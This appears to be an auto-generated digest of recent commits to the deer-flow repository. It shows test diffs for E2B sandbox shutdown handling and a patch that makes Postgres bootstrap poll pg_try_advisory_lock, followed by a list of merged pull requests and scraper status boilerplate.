     provider._capacity_cond = threading.Condition(provider._lock)
     provider._shutdown_called = False
+    provider._shutdown_cleanup_pending = False
     provider._owner_id = "owner-a"
     provider._ownership = FakeOwnershipStore({}, owner_id=provider._owner_id)
     provider._ownership_config = SimpleNamespace(
@@ -3175,6 +3177,107 @@ def test_release_skips_warm_pool_when_sync_reveals_dead_vm(monkeypatch, tmp_path
     assert client.killed is True
 
 
+@pytest.mark.anyio
+async def test_shutdown_defers_teardown_and_fences_cached_acquire_while_maintenance_thread_is_alive():
+    p = _make_provider()
+    p._acquire_executor = ThreadPoolExecutor(
+        max_workers=1,
+        thread_name_prefix="e2b-shutdown-acquire-test",
+    )
+    client = FakeClient(sandbox_id="sb-owned")
+    sandbox = _make_sandbox(client, sandbox_id="sb-owned")
+    p._sandboxes = {"sb-owned": sandbox}
+    p._owned_sandbox_ids = {"sb-owned"}
+    p._thread_sandboxes[p._thread_key("thread-owned", "user-owned")] = "sb-owned"
+
+    class JoinControlledThread:
+        def __init__(self) -> None:
+            self.alive = True
+            self.join_timeout: float | None = None
+
+        def join(self, timeout: float | None = None) -> None:
+            self.join_timeout = timeout
+
+        def is_alive(self) -> bool:
+            return self.alive
+
+    lease_thread = JoinControlledThread()
+    p._lease_thread = lease_thread
+
+    with pytest.raises(RuntimeError, match="lease renewal"):
+        p.shutdown()
+
+    assert p._shutdown_called is True
+    assert p._shutdown_cleanup_pending is True
+    assert p._maintenance_stop.is_set()
+    assert p._sandboxes == {"sb-owned": sandbox}
+    assert p._thread_sandboxes[p._thread_key("thread-owned", "user-owned")] == "sb-owned"
+    assert client.killed is False
+    assert lease_thread.join_timeout == 11.0
+
+    with pytest.raises(SandboxCapacityExceededError) as sync_exc:
+        p.acquire("thread-owned", user_id="user-owned")
+    assert sync_exc.value.reason == "shutdown"
+
+    with pytest.raises(SandboxCapacityExceededError) as async_exc:
+        await p.acquire_async("thread-owned", user_id="user-owned")
+    assert async_exc.value.reason == "shutdown"
+
+    lease_thread.alive = False
+    p.shutdown()
+
+    assert p._shutdown_called is True
+    assert p._shutdown_cleanup_pending is False
+    assert p._sandboxes == {}
+    assert client.killed is True
+
+
+def test_atexit_shutdown_logs_pending_cleanup_without_raising(monkeypatch, caplog):
+    mod = importlib.import_module("deerflow.community.e2b_sandbox.e2b_sandbox_provider")
+    p = _make_provider()
+
+    def blocked_shutdown() -> None:
+        with p._lock:
+            p._shutdown_called = True
+            p._shutdown_cleanup_pending = True
+        raise mod._E2BMaintenanceShutdownTimeout("E2B maintenance thread shutdown timed out: lease renewal")
+
+    monkeypatch.setattr(p, "shutdown", blocked_shutdown)
+
+    p._shutdown_at_exit()
+
+    assert p._shutdown_cleanup_pending is True
+    assert "still pending at interpreter exit" in caplog.text
+
+
+def test_signal_handler_forwards_original_action_when_shutdown_cleanup_is_pending(monkeypatch):
+    mod = importlib.import_module("deerflow.community.e2b_sandbox.e2b_sandbox_provider")
+    p = _make_provider()
+    registered: dict[int, Any] = {}
+    forwarded: list[tuple[int, Any]] = []
+
+    def original_handler(signum, frame):
+        forwarded.append((signum, frame))
+
+    monkeypatch.setattr(signal, "getsignal", lambda _signum: original_handler)
+    monkeypatch.setattr(signal, "signal", lambda signum, handler: registered.__setitem__(signum, handler))
+
+    def blocked_shutdown() -> None:
+        with p._lock:
+            p._shutdown_called = True
+            p._shutdown_cleanup_pending = True
+        raise mod._E2BMaintenanceShutdownTimeout("E2B maintenance thread shutdown timed out: lease renewal")
+
+    monkeypatch.setattr(p, "shutdown", blocked_shutdown)
+    p._register_signal_handlers()
+
+    frame = object()
+    registered[signal.SIGTERM](signal.SIGTERM, frame)
+
+    assert forwarded == [(signal.SIGTERM, frame)]
+    assert p._shutdown_cleanup_pending is True
+
+
 def test_shutdown_only_kills_sandboxes_owned_by_current_instance(monkeypatch):
     p = _make_provider()
     owned_client = FakeClient(sandbox_id="sb-owned")
```

---

### Incident Patch 15: `7f2c0fbe` (2026-10-05)
**Commit Message**: fix(persistence): wait out a peer's Postgres bootstrap past command_timeout (#6306)

* fix(persistence): wait out a peer's Postgres bootstrap past command_timeout

The bootstrap advisory lock was taken with a blocking pg_advisory_lock on
the app engine, whose asyncpg command_timeout (30s by default) also bounds
that statement. A second Gateway instance therefore failed startup with
TimeoutError whenever another instance's migration outlasted the timeout.

Poll the non-blocking pg_try_advisory_lock instead: each attempt returns
immediately and stays bounded by command_timeout, while the wait lasts as
long as the holder's migration. The wait is logged once.

* docs(changelog): reference #6306 in the bootstrap lock entry

* docs(persistence): describe polled bootstrap lock in the migrations guide

---------

Co-authored-by: Willem Jiang <[REDACTED_EMAIL]>

**File**: `CHANGELOG.md` (modified, +10/-0)
```diff
@@ -466,6 +466,15 @@ This release closes that milestone with **301 merged pull requests**.
 
 ### Fixed
 
+- **persistence:** A second Gateway instance no longer fails startup with
+  `TimeoutError` while another instance runs a PostgreSQL schema migration. The
+  bootstrap advisory lock was taken with a blocking `pg_advisory_lock` on the
+  app engine, whose asyncpg `database.command_timeout` (30s by default) also
+  applies to that statement, so any migration longer than the timeout aborted
+  the waiting instance. Acquisition now polls the non-blocking
+  `pg_try_advisory_lock`: the wait lasts as long as the holder's migration,
+  each attempt stays bounded by `command_timeout`, and the wait is logged once.
+  ([#6306])
 - **projects:** Reading a shelf document for the first time no longer blocks
   every other database write on SQLite while the document converts. Lazy
   conversion ran pymupdf/markitdown inside the `BEGIN IMMEDIATE` transaction
@@ -7746,3 +7755,4 @@ with **180 merged pull requests** since the first 2.0 milestone tag.
 [#6263]: https://github.com/bytedance/deer-flow/pull/6263
 [#6282]: https://github.com/bytedance/deer-flow/pull/6282
 [#6305]: https://github.com/bytedance/deer-flow/pull/6305
+[#6306]: https://github.com/bytedance/deer-flow/pull/6306
```

**File**: `CHANGELOG_zh.md` (modified, +7/-0)
```diff
@@ -423,6 +423,12 @@
 
 ### 修复
 
+- **持久化：** 另一个实例正在执行 PostgreSQL 模式迁移时，第二个 Gateway 实例不再
+  因 `TimeoutError` 启动失败。引导期 advisory lock 此前在应用引擎上以阻塞的
+  `pg_advisory_lock` 获取，而该引擎的 asyncpg `database.command_timeout`（默认
+  30 秒）同样作用于这条语句，因此任何超过该时限的迁移都会让等待中的实例中止。
+  现在获取改为轮询非阻塞的 `pg_try_advisory_lock`：等待时长与持锁方的迁移一致，
+  每次尝试仍受 `command_timeout` 约束，等待只记录一次日志。([#6306])
 - **项目：** 在 SQLite 上首次读取书架文档时，文档转换期间不再阻塞所有其他数据库
   写入。此前懒转换在 `BEGIN IMMEDIATE` 事务内运行 pymupdf/markitdown，以便与移入
   回收站和彻底删除串行化发布；而 SQLite 的这把锁作用于整个数据库，运行状态、线程
@@ -6463,3 +6469,4 @@ DeerFlow 2.0 是围绕"超级智能体"框架的彻底重写，核心包含子
 [#6263]: https://github.com/bytedance/deer-flow/pull/6263
 [#6282]: https://github.com/bytedance/deer-flow/pull/6282
 [#6305]: https://github.com/bytedance/deer-flow/pull/6305
+[#6306]: https://github.com/bytedance/deer-flow/pull/6306
```

**File**: `backend/packages/harness/deerflow/persistence/AGENTS.md` (modified, +2/-0)
```diff
@@ -2,6 +2,8 @@
 
 Postgres bootstrap owns its session-scoped advisory lock until `pg_advisory_unlock` completes. Drain that unlock across host cancellation before leaving the SQLAlchemy connection context; repeated cancellation must not return a pooled session while it still holds the bootstrap mutex. Ordinary database errors remain best-effort and are logged.
 
+Acquire that lock by polling `pg_try_advisory_lock`, never with a blocking `pg_advisory_lock`: the app engine's asyncpg `command_timeout` bounds every statement, so a blocking acquire fails a second instance's startup whenever a peer's migration outlasts it.
+
 When `database.postgres_schema` is configured, both async ORM connections and the synchronous SQLAlchemy connections used by DB-backed custom agents and managed subagents must use the same `search_path`; preserve this invariant when adding another persistence entry point.
 
 Alembic stamp/upgrade workers started inside `bootstrap_schema()` remain owned by the bootstrap critical section until the worker finishes. Drain those `asyncio.to_thread()` calls across host cancellation before releasing the in-process SQLite bootstrap lock or PostgreSQL advisory lock; otherwise another bootstrap can overlap a still-running migration worker.
```

**File**: `backend/packages/harness/deerflow/persistence/bootstrap.py` (modified, +37/-8)
```diff
@@ -50,10 +50,12 @@
 cross-process serialisation. SQLite is single-process safe and cross-process
 best-effort; multi-instance deployments should use Postgres.
 
-* **Postgres -- true cross-process serialisation.** ``pg_advisory_lock`` runs
-  the whole reflect-and-act sequence under an exclusive lock that survives
-  cross-process. Concurrent Gateway instances queue cleanly and the second
-  one observes head as a no-op.
+* **Postgres -- true cross-process serialisation.** A session-level advisory
+  lock runs the whole reflect-and-act sequence under an exclusive lock that
+  survives cross-process. Concurrent Gateway instances wait for it however
+  long the holder's migration takes (polling, so the engine's
+  ``command_timeout`` never cuts the wait short) and the second one observes
+  head as a no-op.
 
 * **SQLite -- single-process serialisation, best-effort cross-process.**
   SQLite is single-node by deployment, so the realistic concurrency case is
@@ -97,7 +99,7 @@
 from alembic.util.exc import CommandError
 from sqlalchemy import inspect as sa_inspect
 from sqlalchemy import text
-from sqlalchemy.ext.asyncio import AsyncEngine
+from sqlalchemy.ext.asyncio import AsyncConnection, AsyncEngine
 
 from deerflow.utils.file_io import await_drained
 
@@ -184,6 +186,11 @@
 # releases the prior lock).
 _PG_LOCK_KEY = 0x0DEE_12F1_0BEE_3682
 
+# Delay between ``pg_try_advisory_lock`` attempts while another instance holds
+# the bootstrap lock. Waiting is a loop of short statements, so the engine's
+# ``command_timeout`` bounds each attempt instead of the whole wait.
+_PG_LOCK_POLL_INTERVAL_SECONDS = 1.0
+
 
 # Tables created by ``0001_baseline.upgrade()``. The legacy branch restricts
 # its ``create_all`` backfill to this set so it does NOT pre-empt later
@@ -521,6 +528,26 @@ def _upgrade(cfg: AlembicConfig, revision: str) -> None:
 # ---------------------------------------------------------------------------
 
 
+async def _acquire_postgres_lock(conn: AsyncConnection) -> None:
+    """Take the session-level bootstrap advisory lock on *conn*, waiting as
+    long as another instance holds it.
+
+    Polls ``pg_try_advisory_lock`` instead of blocking in
+    ``pg_advisory_lock``. The app engine sets asyncpg's ``command_timeout``
+    (30s by default), which applies to every statement without an explicit
+    timeout -- a blocking acquire would raise ``TimeoutError`` and fail
+    startup whenever a peer's migration outlasts it. Each poll returns
+    immediately, so ``command_timeout`` still bounds a stalled round trip
+    while the wait itself stays unbounded, like the holder's migration.
+    """
+    logged_wait = False
+    while not (await conn.execute(text("SELECT pg_try_advisory_lock(:k)"), {"k": _PG_LOCK_KEY})).scalar_one():
+        if not logged_wait:
+            logger.info("bootstrap: postgres advisory lock key=0x%x is held by another instance; waiting", _PG_LOCK_KEY)
+            logged_wait = True
+        await asyncio.sleep(_PG_LOCK_POLL_INTERVAL_SECONDS)
+
+
 @asynccontextmanager
 async def _postgres_lock(engine: AsyncEngine):
     """Hold a Postgres session-level advisory lock for the body of the block.
@@ -547,12 +574,14 @@ async def _postgres_lock(engine: AsyncEngine):
     the kill **for this transaction only** (no global / role-level effect).
     Self-hosted Postgres usually ships with the timeout off, so this is a
     no-op there; on managed PG it is what keeps the lock alive while DDL
-    runs. Must execute *before* ``pg_advisory_lock`` so a slow lock acquire
-    on a heavily-contended cluster is itself protected.
+    runs. Must execute *before* the lock is acquired so a slow acquire on a
+    heavily-contended cluster is itself protected.
+
+    Acquisition polls rather than blocks -- see ``_acquire_postgres_lock``.
     """
     async with engine.connect() as conn:
         await conn.execute(text("SET LOCAL idle_in_transaction_session_timeout = 0"))
-        await conn.execute(text("SELECT pg_advisory_lock(:k)"), {"k": _PG_LOCK_KEY})
+        await _acquire_postgres_lock(conn)
         try:
             logger.info("bootstrap: acquired postgres advisory lock key=0x%x", _PG_LOCK_KEY)
             yield
```

**File**: `backend/packages/harness/deerflow/persistence/migrations/AGENTS.md` (modified, +1/-1)
```diff
@@ -86,7 +86,7 @@ the extra nullable columns and their data remain intact. A regression exercises
 that procedure from the original schema and verifies repository reads/inserts
 and preservation of incarnation data.
 
-**Concurrency safety**: Postgres uses `pg_advisory_lock` to serialise concurrent Gateway instances. SQLite uses a per-engine `asyncio.Lock` for same-process startup and is best-effort across processes via SQLite's file-level write lock + `PRAGMA busy_timeout`; multi-instance deployments should use Postgres. Column revisions in `versions/` additionally use idempotent helpers (`_helpers.py::safe_add_column`, `safe_drop_column`) so repeated post-baseline changes and retries are no-ops when the change is already present.
+**Concurrency safety**: Postgres serialises concurrent Gateway instances with a session-level advisory lock, acquired by polling `pg_try_advisory_lock` so the app engine's `command_timeout` never cuts the wait short. SQLite uses a per-engine `asyncio.Lock` for same-process startup and is best-effort across processes via SQLite's file-level write lock + `PRAGMA busy_timeout`; multi-instance deployments should use Postgres. Column revisions in `versions/` additionally use idempotent helpers (`_helpers.py::safe_add_column`, `safe_drop_column`) so repeated post-baseline changes and retries are no-ops when the change is already present.
 
 **Authoring a new revision**:
 ```bash
```

**File**: `backend/tests/test_persistence_bootstrap_pg_lock.py` (modified, +133/-9)
```diff
@@ -13,37 +13,63 @@
 This test pins:
 
 1. The ``SET LOCAL`` is emitted at all (no silent regression).
-2. It runs **before** ``pg_advisory_lock`` -- otherwise a slow lock acquire
+2. It runs **before** the lock is acquired -- otherwise a slow lock acquire
    on a heavily-contended cluster would itself be vulnerable.
 3. The ``pg_advisory_unlock`` still fires on the way out (the new SQL must
    not break the release path).
 
+It also pins that waiting for a peer's migration is not cut short by the app
+engine's asyncpg ``command_timeout``: acquisition polls the non-blocking
+``pg_try_advisory_lock`` so no single statement outlives that deadline.
+
 We mock the engine instead of standing up a real Postgres because the only
 behaviour worth pinning here is the SQL execution order; the timeout's
-runtime effect is Postgres's contract, not ours.
+runtime effect is Postgres's contract, not ours. The one exception drives
+Gateway startup (``init_engine_from_config``) against a live server and is opt-in via
+``DEERFLOW_TEST_POSTGRES_URL``.
 """
 
 from __future__ import annotations
 
 import asyncio
+import logging
+import os
+import uuid
 
 import pytest
+from sqlalchemy import text
+from sqlalchemy.ext.asyncio import create_async_engine
+from sqlalchemy.schema import DropSchema
 
+from deerflow.config.database_config import DatabaseConfig
 from deerflow.persistence import bootstrap as bootstrap_mod
+from deerflow.persistence.engine import close_engine, get_engine, init_engine_from_config
+
+POSTGRES_URL = os.getenv("DEERFLOW_TEST_POSTGRES_URL")
+
+
+class _FakeResult:
+    def __init__(self, value: object = None) -> None:
+        self._value = value
+
+    def scalar_one(self) -> object:
+        return self._value
 
 
 class _FakeAsyncConn:
     """Async-context-manager stand-in for SQLAlchemy's ``AsyncConnection``.
 
     Records every ``execute(stmt, params)`` so the test can assert SQL order.
+    The advisory lock is always free, so ``pg_try_advisory_lock`` succeeds.
     """
 
     def __init__(self) -> None:
         self.executed: list[tuple[str, dict | None]] = []
 
     async def execute(self, stmt, params=None):
-        self.executed.append((str(stmt), params))
-        return None
+        sql = str(stmt)
+        self.executed.append((sql, params))
+        return _FakeResult(True if "pg_try_advisory_lock" in sql else None)
 
     async def __aenter__(self) -> _FakeAsyncConn:
         return self
@@ -77,10 +103,10 @@ async def test_postgres_lock_disables_idle_in_transaction_kill_before_locking()
     assert set_local_idx is not None, f"SET LOCAL never executed; saw: {sqls}"
     assert "0" in sqls[set_local_idx], f"SET LOCAL did not target value 0: {sqls[set_local_idx]!r}"
 
-    # 2. SET LOCAL precedes pg_advisory_lock.
-    lock_idx = next((i for i, s in enumerate(sqls) if "pg_advisory_lock" in s), None)
-    assert lock_idx is not None, f"pg_advisory_lock never executed; saw: {sqls}"
-    assert set_local_idx < lock_idx, f"SET LOCAL must run before pg_advisory_lock; got order {sqls}"
+    # 2. SET LOCAL precedes the lock acquire.
+    lock_idx = next((i for i, s in enumerate(sqls) if "pg_try_advisory_lock" in s), None)
+    assert lock_idx is not None, f"pg_try_advisory_lock never executed; saw: {sqls}"
+    assert set_local_idx < lock_idx, f"SET LOCAL must run before pg_try_advisory_lock; got order {sqls}"
 
     # 3. pg_advisory_unlock still fires on exit.
     assert any("pg_advisory_unlock" in s for s in sqls), f"pg_advisory_unlock missing; saw: {sqls}"
@@ -114,7 +140,7 @@ async def execute(self, stmt, params=None):
             self.unlock_started.set()
             await self.allow_unlock.wait()
             self.unlock_finished.set()
-        return None
+        return _FakeResult(True if "pg_try_advisory_lock" in sql else None)
 
 
 class _BlockingUnlockEngine:
@@ -158,3 +184,101 @@ async def owner() -> None:
         if not task.done():
             task.cancel()
             await asyncio.gather(task, return_exceptions=True)
+
+
+class _ContendedLockConn(_FakeAsyncConn):
+    """A peer instance holds the bootstrap lock until ``peer_done`` is set.
+
+    Every statement runs under ``command_timeout``, the way asyncpg applies the
+    connection default to statements that pass no explicit timeout, so a
+    blocking ``pg_advisory_lock`` that outlives it raises ``TimeoutError``.
+    """
+
+    def __init__(self, command_timeout: float) -> None:
+        super().__init__()
+        self.command_timeout = command_timeout
+        self.peer_done = asyncio.Event()
+
+    async def execute(self, stmt, params=None):
+        return await asyncio.wait_for(self._execute(str(stmt), params), timeout=self.command_timeout)
+
+    async def _execute(self, sql: str, params: dict | None) -> _FakeResult:
+        self.executed.append((sql, params))
+        if "pg_try_advisory_lock" in sql:
+            return _FakeResult(self.peer_done.is_set())
+        if "pg_advisory_lock" in sql:
+            a
```

#### Recent Merged Pull Requests:
- **PR #6331** (closed): fix(config): reject boolean checkpoint cadence (@mikamikasuki)
- **PR #6328** (2026-10-05): fix(gateway): gate declared multi-instance deployments and require the redis stream bridge (@ggnnggez)
- **PR #6326** (2026-10-05): feat(scheduled-tasks): show goal outcomes and end conditions in run history (@Totoro-qaq)
- **PR #6324** (2026-10-05): test(backend): run make test in four parallel shards (@WillemJiang)
- **PR #6323** (2026-10-05): fix(models): skip undecodable Claude descriptor handoffs (@Guo-Yixin)
- **PR #6319** (2026-10-05): fix(threads): remove a deleted thread's files off the event loop (@hyeonsang010716)
- **PR #6318** (2026-10-05): perf(summarization): skip the summarizer LLM call for an input already proven no-op (@subhash7476)
- **PR #6316** (2026-10-05): fix(subagents): keep isolated-loop shutdown ownership retryable (@poijygfdyy)

---

## 3. Empirical Evidence & Compliance Certification
- **Evidence Provenance**: Fetched directly from verified official GitHub REST API.
- **Zero Disk Footprint**: 0 bytes of unnecessary repository bloat stored locally.
- **TOS & Free-Tier Adherence**: Request pace complied with public API guidelines without fee, penalty, or unauthorized scraping.

---

## 4. Promotion & Integration Status
- **Status**: HARVESTED_DEEP_FORENSIC
- **Master Brain Sync**: Auto-committed to local/remote Master Brain repository.
